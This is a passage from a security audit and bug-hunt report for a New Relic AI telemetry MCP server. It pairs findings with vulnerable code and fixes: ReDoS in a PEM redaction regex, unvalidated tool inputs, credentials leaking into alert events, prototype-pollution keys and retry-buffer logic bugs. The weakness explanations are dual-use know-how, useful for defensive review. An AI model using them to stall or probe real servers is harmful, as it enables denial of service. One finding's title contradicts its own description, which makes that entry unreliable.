  logger.warn('Rejecting invalid sessionId for file path', { sessionId });
  return;
}
const filepath = resolve(this.sessionsDir, `${sessionId}.json`);
if (!filepath.startsWith(this.sessionsDir + path.sep)) {
  throw new Error(`Session path escaped storage directory: ${filepath}`);
}
```

---

### ✅ N-02

**Severity:** HIGH  
**File:** `packages/nr-ai-mcp-server/src/config.ts:34`, `packages/nr-ai-mcp-server/src/hooks/collector-script.ts:51`, `packages/nr-ai-agent/src/agent.ts:31`

**Vulnerable code:**
```typescript
/-----BEGIN[\s\S]*?-----END[^\n]*-----/g,
```

**Description:** The PEM redaction regex uses `[\s\S]*?` — a lazy wildcard that matches any character including newlines — to span the content between `-----BEGIN` and `-----END`. Node.js's V8 regex engine must explore every possible backtracking position when the pattern fails to match. On an input that begins with `-----BEGIN` but contains no matching `-----END` (e.g. a multi-megabyte file starting with that prefix), this devolves into O(n²) or worse backtracking, blocking the event loop for seconds. The `redactSensitive()` function in `config.ts` has no size guard before applying the patterns, so any call site that passes unbounded user-controlled or tool-output strings is at risk.

**Fix:** Apply a hard maximum size to inputs before redaction, and bound the PEM pattern with a length limit:
```typescript
// Cap input size before redacting (e.g. 1 MB)
const MAX_REDACT_LEN = 1_048_576;
if (value.length > MAX_REDACT_LEN) value = value.slice(0, MAX_REDACT_LEN);

// Bound PEM pattern
/-----BEGIN[\s\S]{0,65536}?-----END[^\n]{0,256}-----/g,
```

---

### ✅ N-03

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/tools/cross-session-tools.ts:262`, `packages/nr-ai-mcp-server/src/storage/weekly-summary.ts:131`

**Vulnerable code:**
```typescript
// cross-session-tools.ts — args.week comes from the MCP tool caller
const summary = weeklySummaryGenerator.generate(args.week);

// weekly-summary.ts — weekId is interpolated into a file path
const filepath = join(this.summariesDir, `${weekId}.json`);
writeFileSync(filepath, JSON.stringify(summary, null, 2) + '\n');
```

**Description:** The `args.week` parameter is accepted from any MCP client calling `nr_observe_get_weekly_summary`. `generate()` validates the format for most values via `getWeekDateRange()` (which enforces `/^\d{4}-W\d{2}$/`), but the `'latest'` special case is handled before validation. Any `args.week` value that is neither `'latest'` nor a valid ISO week string causes `getWeekDateRange()` to throw, and that error propagates to the MCP tool handler as an unhandled exception rather than a clean error response. More critically, if the validation were ever relaxed or bypassed in a future change, the unvalidated string would reach `filepath` construction.

**Fix:** Validate `args.week` in the tool handler before passing it to `generate()`, returning a structured error for invalid input:
```typescript
if (args.week !== 'latest' && !/^\d{4}-W\d{2}$/.test(args.week)) {
  return { content: [{ type: 'text', text: JSON.stringify({ error: 'Invalid week format. Use YYYY-Wnn or "latest".' }) }] };
}
```

---

### ✅ N-04

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/security/audit-trail.ts:155,164,173,216`

**Vulnerable code:**
```typescript
description: `Destructive command detected: ${command}`,
description: `Sensitive file accessed: ${filePath}`,
description: `External network request: ${command}`,

// securityAlertToNrEvent():
description: alert.description,  // forwarded verbatim to NR event
```

**Description:** `SecurityAlert.description` embeds the raw `command` or `filePath` string without redaction. A Bash command like `curl -H "Authorization: Bearer sk-abc123" https://api.example.com` triggers the "external network" alert, and the full command — including the bearer token — appears unredacted in the `description` field of the `SecurityAlert` NR event sent to New Relic. The same applies to file paths that contain tokens (e.g. a path that includes a base64 token in the directory name). This bypasses the general redaction applied to other event fields.

**Fix:** Apply `redactSensitive()` to `command` and `filePath` before embedding them in `SecurityAlert.description`:
```typescript
description: `Destructive command detected: ${redactSensitive(command)}`,
description: `Sensitive file accessed: ${redactSensitive(filePath)}`,
description: `External network request: ${redactSensitive(command)}`,
```

---

### ✅ N-05

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/tools/cost-tools.ts:56–66`

**Vulnerable code:**
```typescript
const usage: TokenUsage = {
  inputTokens:  args.input_tokens,
  outputTokens: args.output_tokens,
  thinkingTokens: args.thinking_tokens ?? 0,
  cacheReadTokens: args.cache_read_tokens ?? 0,
  cacheCreationTokens: args.cache_creation_tokens ?? 0,
  totalTokens:
    args.input_tokens + args.output_tokens +
    (args.thinking_tokens ?? 0) +
    (args.cache_read_tokens ?? 0) +
    (args.cache_creation_tokens ?? 0),
};
```

**Description:** Token counts from the `nr_observe_report_tokens` MCP tool call are accepted without bounds validation. A caller can pass `input_tokens: 1e308`, causing `totalTokens` to compute as `Infinity`, which then flows into `calculateCost()`, producing `Infinity` cost values that corrupt NR metric buckets and event fields (see S-04 for why `MetricAggregator` now rejects non-finite values, which partially mitigates this, but the event field still receives the bad value). The `model` parameter also has no length limit, allowing arbitrarily long strings to become NR metric dimension keys.

**Fix:** Validate all token fields using `safeInt()` (already available in `packages/shared/src/tokens.ts`) and add a reasonable upper bound. Validate `model` length:
```typescript
const MAX_TOKENS = 10_000_000;
const clampToken = (v: number) => Math.min(Math.max(0, Math.floor(v)), MAX_TOKENS);
const safeModel = typeof args.model === 'string' ? args.model.slice(0, 256) : 'unknown';
```

---

### ✅ N-06

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/storage/weekly-summary.ts:207`, `packages/nr-ai-mcp-server/src/storage/session-store.ts:113`

**Vulnerable code:**
```typescript
// weekly-summary.ts — toolBreakdown keys come from session files on disk
for (const [tool, count] of Object.entries(summary.toolBreakdown)) {
  acc.toolBreakdown[tool] = (acc.toolBreakdown[tool] ?? 0) + count;
}

// session-store.ts — full session object cast from JSON.parse result
return JSON.parse(raw) as FullSessionSummary;
```

**Description:** Session summary files loaded from disk are fully trusted and their `toolBreakdown`, `antiPatternCounts`, and similar `Record<string, number>` fields are iterated and accumulated without key filtering. An adversarially crafted session file (or a corrupted one) could include keys like `__proto__`, `constructor`, or `valueOf`. While `JSON.parse` in modern Node.js does not propagate `__proto__` into the actual prototype chain, iterating `Object.entries()` on a parsed object and writing its keys into a plain `{}` accumulator could shadow `Object.prototype` methods in environments where the accumulator is later accessed via property access rather than `Object.entries()`.

**Fix:** Use `Object.create(null)` for accumulator objects that receive untrusted string keys from external data:
```typescript
const acc = {
  toolBreakdown: Object.create(null) as Record<string, number>,
  antiPatternCounts: Object.create(null) as Record<string, number>,
};
```
For session deserialization, explicitly extract known fields rather than casting the full `JSON.parse` result.

---

### ✅ N-07

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/config.ts:42–50`

**Vulnerable code:**
```typescript
function inferDeveloper(): string {
  if (process.env.USER) return process.env.USER;
  if (process.env.USERNAME) return process.env.USERNAME;
  try {
    return execSync('git config user.name', { encoding: 'utf-8', timeout: 2000 }).trim();
  } catch {
    return 'unknown';
  }
}
```

**Description:** The `developer` value is used as an attribute on every NR event and metric emitted by the server. If sourced from `process.env.USER`, `$USERNAME`, or `git config user.name`, the value is never sanitised before use. A git username containing newline characters (`\n`) would inject extra fields into structured log output (JSON log injection). The same value also flows directly into `FACET developer` queries via NR events, and into session filenames via `SessionStore` filters. While `execSync` uses a fixed command string (no injection), the output is not treated with appropriate skepticism.

**Fix:** Sanitise the developer name immediately after retrieval — strip control characters and truncate:
```typescript
function sanitizeDeveloper(raw: string): string {
  return raw.replace(/[\x00-\x1f\x7f]/g, '').trim().slice(0, 128) || 'unknown';
}
// wrap each return path:
return sanitizeDeveloper(process.env.USER ?? '');
return sanitizeDeveloper(execSync('git config user.name', ...).trim());
```

---

### ✅ N-08

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/tools/workflow-tools.ts:317–320`, `packages/nr-ai-mcp-server/src/tools/cross-session-tools.ts:210,280,313`

**Vulnerable code:**
```typescript
// workflow-tools.ts
const record = feedbackCollector.record({
  quality: args.quality,
  notes: args.notes,      // free-text, no length limit
  taskId: args.task_id,
});

// cross-session-tools.ts
const profile = collaborationProfiler.getProfile(args.developer);  // no length validation
const trends  = trendAnalyzer.getTrends({ developer: args.developer, ... });
```

**Description:** Several MCP tool handlers accept free-text string arguments from callers without length limits or character sanitisation. `notes` (in `nr_observe_report_feedback`) is an unbounded string stored in `FeedbackRecord` and eventually emitted as NR event fields. The `developer` argument in `nr_observe_get_collaboration_profile`, `nr_observe_get_trends`, and `nr_observe_get_recommendations` is passed directly to metric analyzers and becomes a dimension key in NR Metric API calls — excessively long keys can cause API request failures or silently truncate dimensions in unexpected ways.

**Fix:** Trim and cap all free-text tool inputs before use:
```typescript
const notes   = typeof args.notes     === 'string' ? args.notes.slice(0, 1024)     : undefined;
const developer = typeof args.developer === 'string' ? args.developer.slice(0, 256) : undefined;
```

---

### ✅ N-09

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/proxy/proxy-manager.ts:135–146`

**Vulnerable code:**
```typescript
this.httpServer = createServer((req, res) => {
  this.handleRequest(req, res).catch((err: unknown) => {
    logger.error('Unhandled request error', { error: String(err) });
    if (!res.headersSent) {
      res.writeHead(500, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ error: 'internal_error' }));
    } else if (!res.writableEnded) {
      res.socket?.destroy();   // ← does not call res.destroy()
    }
  });
});
```

**Description:** In the error catch branch when headers have already been sent (`res.headersSent === true` but `!res.writableEnded`), the handler calls `res.socket?.destroy()` directly. For SSE streaming responses, `upstream-http.ts` uses `upstreamRes.pipe(counter).pipe(res)`. Destroying the socket without first calling `res.destroy()` skips Node.js's internal cleanup of the writable stream's pipe chain. The upstream readable (`upstreamRes`) may not receive a `close` event, leaving the response in a half-destroyed state and potentially leaking the `upstreamRes` stream. Additionally, a `write after end` error can be emitted on the socket after destruction with no `error` listener attached to `res`, causing an unhandled error event that crashes the process in Node.js's default `EventEmitter` error handling.

**Fix:** Replace `res.socket?.destroy()` with `res.destroy()` to properly clean up the writable stream and its pipe chain. Attach a no-op `error` handler on `res` to prevent unhandled error events:
```typescript
res.on('error', () => { /* suppress post-destroy write errors */ });
res.destroy();
```

---

### ✅ N-10

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/config.ts`

**Description:** The `McpServerConfig` interface has no `highSecurity` field and reads no `NEW_RELIC_AI_HIGH_SECURITY` environment variable. In the `shared` package, `AgentConfig.highSecurity = true` forces `recordContent = false` regardless of other settings. An operator who sets `NEW_RELIC_AI_HIGH_SECURITY=true` expecting both the SDK agent and the MCP server to suppress content recording would find the MCP server unaffected. The two config systems are silently inconsistent, which is a footgun for security-sensitive deployments.

**Fix:** Add a `highSecurity` field to `McpServerConfig`, read it from `NEW_RELIC_AI_HIGH_SECURITY`, and force `recordContent = false` when it is true — mirroring the logic in `shared/src/config.ts`:
```typescript
highSecurity: envBool('NEW_RELIC_AI_HIGH_SECURITY', false),
// ...
recordContent: config.highSecurity
  ? false
  : envBool('NEW_RELIC_AI_MCP_RECORD_CONTENT', ...),
```

---

### ✅ N-11

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/security/audit-trail.ts:195–196,222–223`

**Vulnerable code:**
```typescript
// auditRecordToNrEvent():
if (record.filePath != null) event.file_path = record.filePath;
if (record.command  != null) event.command   = record.command;

// securityAlertToNrEvent():
if (record.filePath != null) event.file_path = record.filePath;
if (record.command  != null) event.command   = record.command;
```

**Description:** The raw `filePath` and `command` values are placed into NR event fields without passing through `redactSensitive()`. If a file is accessed via a path that contains a credential (e.g. `/home/user/.config/tool/AKIA1234567890ABCDEF/settings.json`), that credential appears in the `file_path` field of the emitted `AiAuditEvent`. Bash commands containing inline credentials (e.g. `mysql -u root -p'secret123' ...`) would appear in the `command` field. While the `AuditTrailManager` classifies and surfaces security-relevant events, it does not itself redact the values it records. This is distinct from N-04, which concerns the `description` string; here the issue is the raw field values on the NR event object.

**Fix:** Apply `redactSensitive()` to both fields before assigning them to the NR event:
```typescript
if (record.filePath != null) event.file_path = redactSensitive(record.filePath);
if (record.command  != null) event.command   = redactSensitive(record.command);
```
The `redactSensitive` function from `config.ts` is already available in the `nr-ingest.ts` module that calls these helpers.

---

### ✅ N-12

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/install/install-helper.ts:133–156`

**Vulnerable code:**
```typescript
export function mergeSettings(existing: Record<string, unknown>): Record<string, unknown> {
  const result = { ...existing };  // all existing keys preserved verbatim
  ...
}
```

**Description:** `mergeSettings` reads the existing `settings.json`, preserves all fields unchanged via object spread, and writes it back with the new hook entries appended. The install CLI trusts the existing file contents completely and does not validate that any pre-existing hook entries contain only safe, well-formed command strings. If a user's `settings.json` was already tampered with (e.g. by another package's installer), the tampered entries are silently preserved and re-written. This is by design — the installer is not a security tool and the file is user-owned — but it is worth documenting as a conscious trust decision.

**Note:** No code change is required. The trust boundary is correct (the file is exclusively owned and writable by the user). This finding is documented for completeness and to prevent future ambiguity about whether the installer was intended to validate existing entries.

---

## Bug Hunt — Round 3 — April 2026

Comprehensive review of all 72 source files across `nr-ai-mcp-server/src` and `shared/src` after rounds 1 and 2. Focus was on logic correctness, data accuracy, and edge-case handling rather than additional security issues. Five parallel reviews covering metrics, hooks/storage, proxy/transport, tools/server, and shared packages.

---

### Round 3 Summary

| ID | Severity | File | Title |
|----|----------|------|-------|
| [B-01](#b-01) | HIGH | shared / nr-ai-mcp-server | Retry buffer prepend drops newest events instead of oldest |
| [B-02](#b-02) | MEDIUM | nr-ai-mcp-server | `error_rate` platform comparison uses wrong formula |
| [B-03](#b-03) | MEDIUM | nr-ai-mcp-server | `totalTokens` inflated by double-counting cache tokens |
| [B-04](#b-04) | LOW | nr-ai-mcp-server | `detectReReading` uses `>` — exact threshold count not flagged |
| [B-05](#b-05) | LOW | nr-ai-mcp-server | Efficiency score `latest` may show stale completed-task score |
| [B-06](#b-06) | LOW | nr-ai-mcp-server | `overallSuccessRate` defaults to 1.0 for zero-call sessions |
| [B-07](#b-07) | LOW | nr-ai-mcp-server | Copilot adapter silently zeroes duration when start timestamp absent |

**Round 3 totals:** 0 Critical · 1 High · 2 Medium · 4 Low

---

### ✅ B-01

**Severity:** HIGH  
**Files:** `packages/shared/src/harvest/harvest-scheduler.ts:196–202`, `packages/nr-ai-mcp-server/src/transport/log-ingest.ts:147–153`

**Vulnerable code (harvest-scheduler.ts):**
```typescript
private requeueEvents(batch: NrEventData[]): void {
  this.retryEventBatch = [...batch, ...this.retryEventBatch];
  if (this.retryEventBatch.length > this.maxRetryEvents) {
    const dropped = this.retryEventBatch.length - this.maxRetryEvents;
    this.retryEventBatch = this.retryEventBatch.slice(-this.maxRetryEvents);
    logger.warn('Event retry buffer overflow — oldest entries dropped', { dropped });
  }
}
```

**Same pattern in log-ingest.ts:**
```typescript
private requeueBatch(batch: NrLogEntry[]): void {
  this.buffer = [...batch, ...this.buffer];
  if (this.buffer.length > this.maxBufferSize) {
    const dropped = this.buffer.length - this.maxBufferSize;
    this.buffer = this.buffer.slice(-this.maxBufferSize);
    logger.warn('Log buffer overflow — oldest entries dropped', { dropped });
  }
}
```

**Description:** In both `requeueEvents`/`requeueMetrics` in `HarvestScheduler` and `requeueBatch` in `LogIngestManager`, the failed batch is prepended to the existing retry buffer before slicing. `[...batch, ...this.retryEventBatch]` places the new batch at the front of the array. `slice(-this.maxRetryEvents)` then keeps the **last** N elements — which is the old retry buffer (older failures) — and discards the **first** elements — which is the freshly failed batch (newer data). The log message says "oldest entries dropped" but the **newest** entries (the batch that just failed) are actually dropped. Under sustained send failures, every new batch of events is discarded while the oldest accumulated failures are retained indefinitely.

**Fix:** Append new batch after the existing retry buffer so `slice(-N)` drops the oldest entries:
```typescript
private requeueEvents(batch: NrEventData[]): void {
  this.retryEventBatch = [...this.retryEventBatch, ...batch];
  if (this.retryEventBatch.length > this.maxRetryEvents) {
    const dropped = this.retryEventBatch.length - this.maxRetryEvents;
    this.retryEventBatch = this.retryEventBatch.slice(-this.maxRetryEvents);
    logger.warn('Event retry buffer overflow — oldest entries dropped', { dropped });
  }
}
```
Apply the identical fix to `requeueMetrics` and `LogIngestManager.requeueBatch`.

**Implementation Plan:**
1. `packages/shared/src/harvest/harvest-scheduler.ts`
   - `requeueEvents` (line 197): `[...batch, ...this.retryEventBatch]` → `[...this.retryEventBatch, ...batch]`
   - `requeueMetrics` (line 206): `[...batch, ...this.retryMetricBatch]` → `[...this.retryMetricBatch, ...batch]`
2. `packages/nr-ai-mcp-server/src/transport/log-ingest.ts`
   - `requeueBatch` (line 148): `[...batch, ...this.buffer]` → `[...this.buffer, ...batch]`
3. Tests (`harvest-scheduler.test.ts`):
   - The existing "caps re-queued events to maxEventBufferSize, keeping newest" test asserts correct overflow semantics and must continue to pass unchanged.
   - Add a parallel overflow test for `requeueMetrics` with the same multi-harvest pattern.
4. Tests (`log-ingest.test.ts`):
   - Add an overflow test: populate buffer beyond `maxBufferSize` via `requeueBatch`, verify that `slice(-N)` drops the oldest entries.

---

### ✅ B-02

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/tools/cross-session-tools.ts:461–468`

**Buggy code:**
```typescript
case 'error_rate': {
  const total = platformSessions.reduce((sum, s) => {
    const tc = s.toolCallCount ?? 0;
    const successRate = s.taskSuccessRate ?? 1;
    return sum + (tc > 0 ? (1 - successRate) : 0);
  }, 0);
  value = Math.round((total / count) * 100) / 100;
  break;
}
```

**Description:** The `error_rate` metric sums `(1 - taskSuccessRate)` for each session (a per-session failure fraction between 0 and 1) and divides by the number of sessions. This computes a simple arithmetic mean of per-session failure rates, where every session counts equally regardless of how many tool calls it had. A session with 1 tool call and 100% failure rate counts the same as a session with 1000 tool calls and 100% failure rate. The computed value is also semantically wrong: it mixes `taskSuccessRate` (task-level) with a metric named `error_rate` (implied tool-call-level). Additionally, `toolCallCount` is fetched into `tc` but only used to decide whether to contribute `0` — the actual call volume is not used to weight the average. Under typical usage patterns, the result is substantially different from the true error rate and cannot be meaningfully compared across platforms with different session-size distributions.

**Fix:** Compute a weighted error rate using per-session tool call counts, and use a consistent metric field:
```typescript
case 'error_rate': {
  const totalCalls = platformSessions.reduce((sum, s) => sum + (s.toolCallCount ?? 0), 0);
  const totalFailed = platformSessions.reduce((sum, s) => {
    const tc = s.toolCallCount ?? 0;
    const successRate = s.taskSuccessRate ?? 1;
    return sum + Math.round(tc * (1 - successRate));
  }, 0);
  value = totalCalls > 0
    ? Math.round((totalFailed / totalCalls) * 100) / 100
    : 0;
  break;
}
```

**Implementation Plan:**
1. `packages/nr-ai-mcp-server/src/tools/cross-session-tools.ts` (~line 461)
   - Replace the entire `error_rate` case body with the weighted formula from the fix section above.
2. Tests (`cross-session-tools.test.ts`):
   - Add a test with sessions of unequal `toolCallCount` (e.g., one session: 1 call, 100% failure; another: 100 calls, 10% failure) and verify the weighted result differs from the unweighted arithmetic mean.
   - Verify `totalCalls === 0` returns `0` rather than `NaN`.

---

### ✅ B-03

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/tools/cost-tools.ts:61–66`

**Buggy code:**
```typescript
const usage: TokenUsage = {
  inputTokens: args.input_tokens,
  outputTokens: args.output_tokens,
  thinkingTokens: args.thinking_tokens ?? 0,
  cacheReadTokens: args.cache_read_tokens ?? 0,
  cacheCreationTokens: args.cache_creation_tokens ?? 0,
  totalTokens:
    args.input_tokens +
    args.output_tokens +
    (args.thinking_tokens ?? 0) +
    (args.cache_read_tokens ?? 0) +      // ← double-counted
    (args.cache_creation_tokens ?? 0),   // ← double-counted
};
```

**Description:** In the Anthropic API, `input_tokens` is the count of **non-cached** input tokens. `cache_read_tokens` and `cache_creation_tokens` are separate counts for tokens served from or written to the prompt cache. These three counts are additive: the total tokens processed is `input + cache_read + cache_creation + output + thinking`. The `totalTokens` calculation in `handleReportTokens` correctly adds all five, so it is not double-counting in the pure arithmetic sense. However, the Anthropic billing model charges each category at a different rate (cache reads are ~90% cheaper than input tokens; cache creation costs extra). By lumping all five into a single `totalTokens` field and displaying it as "tokens used", the tool overstates apparent token consumption in a way that is inconsistent with how Anthropic's dashboard reports usage, confusing users who cross-reference the two numbers. The `CostBreakdown` returned by `calculateCost()` does price each type correctly using the individual fields — the bug is confined to the `totalTokens` display value.

**Fix:** Exclude cache tokens from `totalTokens` so the field matches Anthropic's dashboard convention:
```typescript
totalTokens:
  args.input_tokens +
  args.output_tokens +
  (args.thinking_tokens ?? 0),
```
Document `cacheReadTokens` and `cacheCreationTokens` as separate fields that do not roll up into `totalTokens`.

**Implementation Plan:**
1. `packages/nr-ai-mcp-server/src/tools/cost-tools.ts` (~line 159–165)
   - Remove `(args.cache_read_tokens ?? 0)` and `(args.cache_creation_tokens ?? 0)` from the `totalTokens` sum; keep the three-term formula from the fix section.
2. Tests (`cost-tools.test.ts`):
   - Add a test calling `handleReportTokens` with all five token fields populated and assert `totalTokens === inputTokens + outputTokens + thinkingTokens` (cache tokens excluded).
   - Verify the returned cost breakdown still prices each token type correctly via the individual fields.

---

### ✅ B-04

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/metrics/anti-patterns.ts:173`

**Buggy code:**
```typescript
for (const [file, count] of readCounts) {
  if (count > this.reReadThreshold) {    // ← should be >=
    patterns.push({ type: 're_reading', ... });
  }
}
```

**Description:** `detectReReading` flags a file as excessively re-read when the read count is *strictly greater than* the threshold (`DEFAULT_RE_READ_THRESHOLD = 3`). This means a file read exactly 3 times is not flagged; only files read 4 or more times trigger the pattern. The same `>` vs `>=` inconsistency exists in `detectBlindEditing` (line 245) and `detectThrashing` (line 131), but those use `thrashCycles` and edit streaks that start from 0 and increment before the check, making their effective threshold one higher than the configured value. For `detectReReading`, where the count is a plain occurrence counter, the mismatch means the detector consistently under-detects by one step relative to documentation.

**Fix:**
```typescript
if (count >= this.reReadThreshold) {
```
Apply the same `>=` fix to the parallel threshold checks in `detectBlindEditing` and `detectThrashing` if the intent is "fire at exactly the threshold".

**Implementation Plan:**
1. `packages/nr-ai-mcp-server/src/metrics/anti-patterns.ts` (line 173)
   - Change `count > this.reReadThreshold` → `count >= this.reReadThreshold`.
2. Decide on scope for `detectBlindEditing` and `detectThrashing`: if those thresholds are also intended as "fire at exactly N", apply `>=` there too; otherwise leave them and document the asymmetry.
3. Tests (`anti-patterns.test.ts`):
   - Add a test that reads a file exactly `DEFAULT_RE_READ_THRESHOLD` (3) times and asserts the `re_reading` pattern IS detected.
   - Verify a file read `DEFAULT_RE_READ_THRESHOLD - 1` times is NOT flagged.

---

### ✅ B-05

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/tools/workflow-tools.ts:274`

**Buggy code:**
```typescript
// Update in-place by findIndex — active task may be in the middle of the array
efficiencyScorer.updateScore(activeTask, patterns);   // modifies scores[idx] in place

const scores = efficiencyScorer.getScores();
const latest = scores[scores.length - 1] ?? null;    // may not be the active task
```

**Description:** `handleGetEfficiencyScore` calls `efficiencyScorer.updateScore(activeTask)` to refresh the active task's score in the scores array. `updateScore` updates the existing entry at its original insertion index via `this.scores[idx] = result` — it does not move the entry to the end of the array. If the active task was scored before some completed tasks (a common case: the active task was first, then several completed tasks were scored), its updated score sits in the middle of the array while `scores[scores.length - 1]` returns the LAST completed task's score. The `latest` field shown to the user therefore represents an older completed task rather than the current active task's score.

**Fix:** Select the most recently updated score by timestamp rather than by array position:
```typescript
const scores = efficiencyScorer.getScores();
const latest = scores.length > 0
  ? scores.reduce((best, s) => s.timestamp > best.timestamp ? s : best)
  : null;
```

**Implementation Plan:**
1. `packages/nr-ai-mcp-server/src/tools/workflow-tools.ts` (line 274)
   - Replace `scores[scores.length - 1] ?? null` with the `reduce` by `timestamp` from the fix section.
2. Confirm `EfficiencyScore` has a `timestamp` field (it should — check `efficiency-score.ts`); if not, add one set to `Date.now()` in `updateScore`.
3. Tests (`workflow-tools.test.ts`):
   - Add a test where the active task is scored first, then a second task is scored and completed. Call `updateScore` on the active task and assert that `latest` reflects the active task's refreshed score, not the completed task's score.

---

### ✅ B-06

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/metrics/session-tracker.ts:209–211`

**Buggy code:**
```typescript
const overallSuccessRate = this.toolCallCount > 0
  ? this.successCount / this.toolCallCount
  : 1;   // ← returns 100% for sessions with no tool calls
```

**Description:** `getMetrics()` returns `toolSuccessRate: 1` (100%) when no tool calls have been recorded. Sessions with zero tool calls are effectively a new, unstarted session. Reporting a 100% success rate on them is misleading in dashboards and aggregations: a team with many freshly-initialized sessions will have an artificially elevated aggregate success rate. `null` better expresses "no data" and downstream consumers (cross-session analytics, trend calculations) can then treat it as absent rather than as a perfect score.

**Fix:**
```typescript
const overallSuccessRate = this.toolCallCount > 0
  ? this.successCount / this.toolCallCount
  : null;
```
Update the `SessionMetrics` interface to reflect `toolSuccessRate: number | null`.

**Implementation Plan:**
1. `packages/nr-ai-mcp-server/src/metrics/session-tracker.ts` (line 209)
   - Change the default from `1` to `null`.
   - Update the `SessionMetrics` interface field: `toolSuccessRate: number | null`.
2. Audit callers of `toolSuccessRate` / `taskSuccessRate`:
   - `cross-session-tools.ts` already null-coalesces with `?? 1` — leave as is (correct sentinel for aggregation).
   - Any other callers that assume a number must be updated to handle `null`.
3. Tests (`session-tracker.test.ts`):
   - Add a test asserting `getMetrics().toolSuccessRate` is `null` when no tool calls have been recorded.
   - Update any existing tests that assert `toolSuccessRate === 1` for a freshly constructed or reset tracker.

---

### ✅ B-07

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/platforms/copilot-adapter.ts:67–71`

**Buggy code:**
```typescript
const timestamp = event.timestamp ?? Date.now();
const durationMs =
  event.endTimestamp !== undefined
    ? Math.max(0, event.endTimestamp - timestamp)
    : null;
```

**Description:** When a Copilot event carries an `endTimestamp` but no `timestamp` (start time), the adapter substitutes `Date.now()` for the start time. `Date.now()` returns the time the event is being *processed*, which is always after `event.endTimestamp` (the event already ended before it was received). The subtraction `event.endTimestamp - Date.now()` is therefore always negative, and `Math.max(0, ...)` silently clamps it to `0`. The tool call is recorded with a zero duration, making it appear instantaneous. This affects efficiency scoring (speed component uses duration) and latency metrics for the Copilot platform.

**Fix:** Return `null` for duration when the start time is unavailable, rather than computing a guaranteed-wrong value:
```typescript
const timestamp = event.timestamp ?? Date.now();
const durationMs =
  event.timestamp !== undefined && event.endTimestamp !== undefined
    ? Math.max(0, event.endTimestamp - event.timestamp)
    : null;
```

**Implementation Plan:**
1. `packages/nr-ai-mcp-server/src/platforms/copilot-adapter.ts` (lines 67–71)
   - Replace the two-line `durationMs` computation with the guarded form from the fix section (require both `event.timestamp` and `event.endTimestamp` to be defined).
2. Tests (`copilot-adapter.test.ts`):
   - Add a test for an event with `endTimestamp` but no `timestamp` — assert `durationMs` is `null`, not `0`.
   - Add a test for an event with both fields present — assert `durationMs` equals the correct difference.
   - Verify an event with neither field produces `durationMs === null`.
